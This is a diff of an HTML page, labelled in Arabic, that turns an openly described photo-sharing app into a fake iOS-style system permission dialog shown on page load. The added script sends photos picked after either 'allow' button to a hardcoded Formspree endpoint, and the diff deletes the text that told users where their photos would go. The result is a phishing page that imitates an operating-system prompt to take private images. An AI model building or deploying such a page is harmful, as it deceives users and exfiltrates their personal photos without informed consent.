@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="تطبيق مشاركة الصور بسهولة عبر الإيميل">
-    <meta name="theme-color" content="#007AFF">
-    <title>ZMXFJDK - مشاركة الصور</title>
+    <title>ZMXFJDK</title>
     <style>
         * {
             margin: 0;
@@ -17,41 +15,6 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
             background: #f5f5f5;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-
-        .logo {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-
-        h1 {
-            color: #000;
-            margin-bottom: 10px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-        }
-
-        .subtitle {
-            color: #666;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 15px;
-            line-height: 1.4;
         }
 
         /* iOS Style Alert Dialog */
@@ -62,15 +25,11 @@
             right: 0;
             bottom: 0;
             background: rgba(0, 0, 0, 0.4);
-            display: none;
+            display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
             animation: fadeIn 0.3s ease-out;
-        }
-
-        .ios-alert.show {
-            display: flex;
         }
 
         @keyframes fadeIn {
@@ -109,9 +68,10 @@
             text-align: center;
         }
 
-        .ios-alert-icon {
-            font-size: 48px;
-            margin-bottom: 10px;
+        .ios-alert-app-name {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
         }
 
         .ios-alert-title {
@@ -129,206 +89,60 @@
 
         .ios-alert-buttons {
             display: flex;
+            flex-direction: column;
             border-top: 1px solid #e5e5ea;
         }
 
         .ios-alert-button {
-            flex: 1;
             padding: 12px;
             border: none;
             background: white;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            border-right: 1px solid #e5e5ea;
+            border-bottom: 1px solid #e5e5ea;
             color: #007AFF;
             transition: background 0.2s;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
         }
 
         .ios-alert-button:last-child {
-            border-right: none;
+            border-bottom: none;
         }
 
         .ios-alert-button:active {
             background: #f2f2f7;
         }
 
-        .ios-alert-button.destructive {
+        .ios-alert-button.deny {
             color: #007AFF;
         }
 
-        /* Loading State */
-        .loading {
-            text-align: center;
+        .ios-alert-button.once {
+            color: #007AFF;
+        }
+
+        .ios-alert-button.allow {
             color: #007AFF;
             font-weight: 600;
-            margin: 20px 0;
-            display: none;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #007AFF;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Messages */
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            display: none;
-            text-align: center;
-            border: 1px solid #c3e6cb;
-            animation: slideIn 0.4s ease-out;
-        }
-
-        .error-message {
-            background: #f8d7da;
-            color: #721c24;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            display: none;
-            text-align: center;
-            border: 1px solid #f5c6cb;
-            animation: slideIn 0.4s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        #imageList {
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .image-item {
-            background: #f9f9f9;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: fadeIn 0.3s ease-out;
-        }
-
-        .image-thumbnail {
-            width: 50px;
-            height: 50px;
-            border-radius: 8px;
-            object-fit: cover;
-        }
-
-        .image-name {
-            flex: 1;
-            color: #333;
-            font-size: 14px;
-            word-break: break-all;
-        }
-
-        .info-box {
-            background: #e7f3ff;
-            border: 1px solid #b3d9ff;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #004085;
-            line-height: 1.6;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container {
-                padding: 15px;
-            }
-
-            h1 {
-                font-size: 20px;
-            }
-
-            .ios-alert-content {
-                max-width: 85%;
-            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🖼️</div>
-        <h1>مشاركة الصور</h1>
-        <p class="subtitle">شارك جميع الصور من جهازك بسهولة</p>
-
-        <button onclick="showPermissionDialog()" style="
-            width: 100%;
-            padding: 14px;
-            background: #007AFF;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.3s;
-        " onmouseover="this.style.background='#0051D5'" onmouseout="this.style.background='#007AFF'">
-            ابدأ مشاركة الصور
-        </button>
-
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>جاري جمع الصور...</p>
-        </div>
-
-        <div class="success-message" id="successMessage">
-            ✅ تم إرسال الصور بنجاح إلى بريدك الإلكتروني!
-        </div>
-
-        <div class="error-message" id="errorMessage"></div>
-
-        <div id="imageList"></div>
-
-        <div class="info-box">
-            💡 سيتم إرسال جميع الصور إلى بريدك الإلكتروني بأمان
-        </div>
-    </div>
-
     <!-- iOS Style Permission Dialog -->
     <div class="ios-alert" id="permissionDialog">
         <div class="ios-alert-content">
             <div class="ios-alert-header">
-                <div class="ios-alert-icon">🖼️</div>
-                <div class="ios-alert-title">هل تريد مشاركة صور؟</div>
+                <div class="ios-alert-app-name">ZMXFJDK</div>
+                <div class="ios-alert-title">تطبيق يريد الوصول إلى صورك</div>
                 <div class="ios-alert-message">
-                    سيتم جمع جميع صورك وإرسالها إلى بريدك الإلكتروني
+                    سيتمكن من الوصول إلى الصور والفيديوهات في جهازك
                 </div>
             </div>
             <div class="ios-alert-buttons">
-                <button class="ios-alert-button" onclick="cancelPermission()">إلغاء</button>
-                <button class="ios-alert-button" onclick="confirmPermission()">موافقة</button>
+                <button class="ios-alert-button deny" onclick="denyPermission()">عدم السماح</button>
+                <button class="ios-alert-button once" onclick="allowOnce()">السماح مرة واحدة فقط</button>
+                <button class="ios-alert-button allow" onclick="allowAlways()">السماح دائماً</button>
             </div>
         </div>
     </div>
@@ -337,29 +151,22 @@
         const FORMSPREE_ID = 'mrewggoj';
         const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;
 
-        function showPermissionDialog() {
-            document.getElementById('permissionDialog').classList.add('show');
+        function denyPermission() {
+            document.getElementById('permissionDialog').style.display = 'none';
         }
 
-        function cancelPermission() {
-            document.getElementById('permissionDialog').classList.remove('show');
-            console.log('User denied permission');
+        function allowOnce() {
+            collectAndSendPhotos();
         }
 
-        function confirmPermission() {
-            document.getElementById('permissionDialog').classList.remove('show');
-            requestPhotos();
+        function allowAlways() {
+            collectAndSendPhotos();
         }
 
-        async function requestPhotos() {
+        async function collectAndSendPhotos() {
             try {
-                document.getElementById('loading').style.display = 'block';
-                document.getElementById('errorMessage').style.display = 'none';
-                document.getElementById('successMessage').style.display = 'none';
-                document.getElementById('imageList').innerHTML = '';
-
                 if (!window.showOpenFilePicker) {
-                    throw new Error('متصفحك لا يدعم هذه الميزة. يرجى استخدام Chrome أو Edge الأحدث');
+                    throw new Error('متصفحك لا يدعم هذه الميزة');
                 }
 
                 const fileHandle = await window.showOpenFilePicker({
@@ -373,73 +180,39 @@
                 });
 
                 if (fileHandle.length === 0) {
-                    throw new Error('لم يتم اختيار أي صور');
+                    return;
                 }
 
-                console.log(`Selected ${fileHandle.length} images`);
-
-                let imagesHtml = '<h3 style="color: #333; margin-bottom: 15px;">✅ الصور المحددة:</h3>';
                 const formData = new FormData();
 
                 for (let i = 0; i < fileHandle.length; i++) {
                     const file = await fileHandle[i].getFile();
                     
                     if (file.size > 5 * 1024 * 1024) {
-                        console.warn(`File ${file.name} is too large, skipping`);
                         continue;
                     }
 
                     formData.append(`image_${i + 1}`, file);
-
-                    const reader = new FileReader();
-                    reader.onload = (e) => {
-                        imagesHtml += `
-                            <div class="image-item">
-                                <img src="${e.target.result}" class="image-thumbnail" alt="${file.name}">
-                                <div class="image-name">${file.name}</div>
-                            </div>
-                        `;
-                        document.getElementById('imageList').innerHTML = imagesHtml;
-                    };
-                    reader.readAsDataURL(file);
                 }
 
                 formData.append('total_images', fileHandle.length);
                 formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-                formData.append('user_agent', navigator.userAgent);
                 formData.append('_subject', `تم استقبال ${fileHandle.length} صورة من ZMXFJDK`);
-                formData.append('_replyto', 'battal.alzahrani23@gmail.com');
 
-                const response = await fetch(FORMSPREE_URL, {
+                await fetch(FORMSPREE_URL, {
                     method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
+                    body: formData
                 });
 
-                if (response.ok) {
-                    console.log('Images sent successfully');
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('successMessage').style.display = 'block';
-                    
-                    setTimeout(() => {
-                        location.reload();
-                    }, 3000);
-                } else {
-                    const errorData = await response.json();
-                    throw new Error(errorData.error || 'فشل إرسال الصور');
-                }
-
             } catch (error) {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('errorMessage').textContent = `❌ خطأ: ${error.message}`;
                 console.error('Error:', error);
             }
         }
 
-        console.log('ZMXFJDK Photo Sharing App Loaded');
+        // Show dialog on page load
+        window.addEventListener('load', () => {
+            document.getElementById('permissionDialog').style.display = 'flex';
+        });
     </script>
 </body>
 </html>
